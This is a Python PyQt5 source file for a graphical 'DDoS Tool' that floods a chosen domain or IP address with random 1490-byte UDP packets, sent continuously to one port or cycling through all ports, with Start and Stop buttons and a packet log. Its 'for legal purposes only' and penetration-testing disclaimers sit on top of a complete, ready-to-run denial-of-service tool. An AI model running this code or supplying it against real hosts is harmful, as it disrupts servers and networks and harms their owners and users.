import sys
import socket
import random
import time
import threading

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton, QTextEdit, QVBoxLayout,
    QHBoxLayout, QRadioButton, QMessageBox
)
from PyQt5.QtCore import Qt, pyqtSignal

version = "1.2"

class RDDoS_Tool_GUI(QWidget):
    log_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"DDoS Tool v{version} - For legal purposes only")
        self.setGeometry(300, 200, 600, 500)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)
        self.is_attacking = False
        self.attack_thread = None

        self.initUI()
        self.log_signal.connect(self.append_output)  # Bağlantı kuruldu!

    def initUI(self):
        banner = QLabel(
            "<font color='red'><b>DDoS Tool</b></font> <font color='purple'>Version: {}</font><br>"
            "Author: <font color='red'>ctrl-alt-del-2010</font><br>"
            "Github: <a href='https://github.com/ctrl-alt-del-2010-developer/Simple-Tool-Kit/Programs/DDoS_tool'>DDoS_Tool</a><br>"
            "<font color='green'>For legal purposes only</font>".format(version)
        )
        banner.setTextFormat(Qt.RichText)
        banner.setOpenExternalLinks(True)

        self.radio_domain = QRadioButton("Website Domain")
        self.radio_ip = QRadioButton("IP Address")
        self.radio_domain.setChecked(True)
        radio_layout = QHBoxLayout()
        radio_layout.addWidget(self.radio_domain)
        radio_layout.addWidget(self.radio_ip)

        self.input_target = QLineEdit()
        self.input_target.setPlaceholderText("Enter domain (e.g. example.com) or IP address")

        self.radio_all_ports = QRadioButton("All Ports")
        self.radio_certain_port = QRadioButton("Certain Port")
        self.radio_all_ports.setChecked(True)
        port_radio_layout = QHBoxLayout()
        port_radio_layout.addWidget(self.radio_all_ports)
        port_radio_layout.addWidget(self.radio_certain_port)

        self.input_port = QLineEdit()
        self.input_port.setPlaceholderText("Enter port (default: 2)")
        self.input_port.setEnabled(False)

        self.radio_certain_port.toggled.connect(self.on_port_radio_toggle)

        self.button_start = QPushButton("Start Attack")
        self.button_stop = QPushButton("Stop")
        self.button_stop.setEnabled(False)

        self.button_start.clicked.connect(self.start_attack)
        self.button_stop.clicked.connect(self.stop_attack)

        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)

        self.button_about = QPushButton("About")
        self.button_about.clicked.connect(self.show_about)

        main_layout = QVBoxLayout()
        main_layout.addWidget(banner)
        main_layout.addLayout(radio_layout)
        main_layout.addWidget(self.input_target)
        main_layout.addWidget(QLabel("Port Selection:"))
        main_layout.addLayout(port_radio_layout)
        main_layout.addWidget(self.input_port)
        btn_layout = QHBoxLayout()
        btn_layout.addWidget(self.button_start)
        btn_layout.addWidget(self.button_stop)
        btn_layout.addWidget(self.button_about)
        main_layout.addLayout(btn_layout)
        main_layout.addWidget(QLabel("Output:"))
        main_layout.addWidget(self.output_area)
        self.setLayout(main_layout)

    def on_port_radio_toggle(self):
        self.input_port.setEnabled(self.radio_certain_port.isChecked())

    def append_output(self, text):
        self.output_area.append(text)
        self.output_area.verticalScrollBar().setValue(self.output_area.verticalScrollBar().maximum())

    def show_about(self):
        QMessageBox.information(self, "About", (
            "This DDoS Tool is an open source tool for penetration testing.\n"
            "You can test networks/servers/any other devices with it.\n"
            "Author of the program is not responsible for its usage.\n"
            "Everybody MUST use it ONLY in legit cases.\n"
            "For more information visit project's site."
        ))

    def start_attack(self):
        if self.radio_domain.isChecked():
            domain = self.input_target.text().strip()
            if not domain:
                self.append_output("Please enter a domain.")
                return
            try:
                ip = socket.gethostbyname(domain)
            except Exception as e:
                self.append_output(f"Could not resolve domain: {e}")
                return
        else:
            ip = self.input_target.text().strip()
            if not ip:
                self.append_output("Please enter an IP address.")
                return

        if self.radio_all_ports.isChecked():
            port_mode = False
            port = 2
        else:
            port_mode = True
            try:
                port = int(self.input_port.text().strip())
            except ValueError:
                self.append_output("Please enter a valid port number.")
                return
            if port < 2 or port > 65534:
                self.append_output("Port must be between 2 and 65534.")
                return

        self.button_start.setEnabled(False)
        self.button_stop.setEnabled(True)
        self.is_attacking = True
        self.output_area.clear()
        self.append_output("INITIALIZING....")
        time.sleep(1)
        self.append_output("STARTING...")

        self.attack_thread = threading.Thread(target=self.attack, args=(ip, port_mode, port))
        self.attack_thread.start()

    def stop_attack(self):
        self.is_attacking = False
        self.button_stop.setEnabled(False)
        self.button_start.setEnabled(True)
        self.append_output("Attack stopped by user.")

    def attack(self, ip, port_mode, port):
        sent = 0
        try:
            if not port_mode:
                while self.is_attacking:
                    if port == 65534:
                        port = 1
                    elif port == 1900:
                        port = 1901

                    self.sock.sendto(self.bytes, (ip, port))
                    sent += 1
                    port += 1
                    self.log_signal.emit(f"Sent {sent} packets to {ip} through port: {port}")
            else:
                if port < 2:
                    port = 2
                elif port == 65534:
                    port = 2
                elif port == 1900:
                    port = 1901
                while self.is_attacking:
                    self.sock.sendto(self.bytes, (ip, port))
                    sent += 1
                    self.log_signal.emit(f"Sent {sent} packets to {ip} through port: {port}")
        except Exception as e:
            self.log_signal.emit(f"Exited: {str(e)}")
        finally:
            self.button_stop.setEnabled(False)
            self.button_start.setEnabled(True)
            self.is_attacking = False

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = RDDoS_Tool_GUI()
    window.show()
    sys.exit(app.exec_())
